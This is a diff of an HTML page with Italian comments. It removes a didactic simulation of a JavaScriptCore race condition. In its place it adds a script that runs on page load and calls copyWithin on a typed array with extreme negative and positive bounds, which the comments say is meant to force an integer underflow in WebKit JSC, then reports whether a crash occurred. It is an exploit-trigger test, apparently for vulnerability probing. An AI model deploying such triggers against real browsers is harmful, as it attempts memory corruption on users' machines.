@@ -1,90 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Demo Struttura JSC (Didattica)</title>
+    <title>Test WebKit JSC</title>
 </head>
 <body>
+    <h1>WebKit JSC Test Page</h1>
     <script>
-        // Simulazione di una transizione di struttura con race condition
-        class StructureSimulator {
-            constructor() {
-                this.properties = {};  // Tabella delle proprietà
-                this.isMaterializing = false;  // Simula "protectPropertyTableWhileTransitioning"
-            }
+        function triggerUnderflow() {
+            try {
+                // 1. Creazione di un ArrayBuffer e TypedArray manipolato
+                const buffer = new ArrayBuffer(0x1000);
+                const evilArray = new Uint8Array(buffer);
 
-            // Aggiungi una proprietà (simula transizione)
-            addProperty(key, value) {
-                if (this.isMaterializing) {
-                    console.warn("Tabella bloccata durante la materializzazione!");
-                    return;
-                }
-                this.properties[key] = value;
-            }
+                // 2. Parametri calcolati per forzare l'integer underflow
+                const start = -0x7FFFFFFF;  // Valore negativo estremo
+                const target = 0x7FFFFFFF;  // Valore oltre i limiti del buffer
 
-            // Materializza la tabella (con "protect" non gestito correttamente)
-            unsafeMaterialize() {
-                this.isMaterializing = true;
-                const tempTable = { ...this.properties };  // Copia non atomica
-                // Simula una pausa che espone la tabella parzialmente inizializzata
-                setTimeout(() => {
-                    this.isMaterializing = false;
-                }, 100);
-                return tempTable;
-            }
+                // 3. Chiamata a copyWithin con parametri "velenosi"
+                evilArray.copyWithin(start, 0, target);
 
-            // Appiattimento con barriere di memoria mancanti
-            flatten() {
-                const oldProps = this.properties;
-                this.properties = Object.fromEntries(Object.entries(oldProps));  // Copia
-                return oldProps;  // Espone la vecchia struttura
+                // 4. Verifica del comportamento anomalo
+                alert("[TEST] Nessun crash rilevato (vulnerabilità patchata?)");
+            } catch (e) {
+                alert("[TEST] Eccezione:", e.message);
             }
         }
 
-        // --------------------------
-        // Dimostrazione delle issue
-        // --------------------------
-        const simulator = new StructureSimulator();
-
-        // Worker 1: Modifica la struttura
-        const worker1 = new Worker(URL.createObjectURL(new Blob([`
-            let count = 0;
-            setInterval(() => {
-                postMessage({ type: 'add', key: 'prop' + count, value: count });
-                count++;
-            }, 10);
-        `], { type: 'text/javascript' }));
-
-        // Worker 2: Accesso concorrente
-        const worker2 = new Worker(URL.createObjectURL(new Blob([`
-            setInterval(() => {
-                postMessage({ type: 'materialize' });
-                postMessage({ type: 'flatten' });
-            }, 20);
-        `], { type: 'text/javascript' }));
-
-        // Gestione messaggi
-        worker1.onmessage = (e) => {
-            if (e.data.type === 'add') {
-                simulator.addProperty(e.data.key, e.data.value);
-            }
-        };
-
-        worker2.onmessage = (e) => {
-            if (e.data.type === 'materialize') {
-                const table = simulator.unsafeMaterialize();
-                console.log("Tabella materializzata:", Object.keys(table));
-            } else if (e.data.type === 'flatten') {
-                const old = simulator.flatten();
-                console.log("Struttura obsoleta:", Object.keys(old));
-            }
-        };
-
-        // Ferma dopo 5 secondi
-        setTimeout(() => {
-            worker1.terminate();
-            worker2.terminate();
-            console.log("Demo terminata. Controlla gli avvisi in console!");
-        }, 5000);
+        // Esecuzione automatica al caricamento della pagina
+        window.onload = triggerUnderflow;
     </script>
 </body>
 </html>
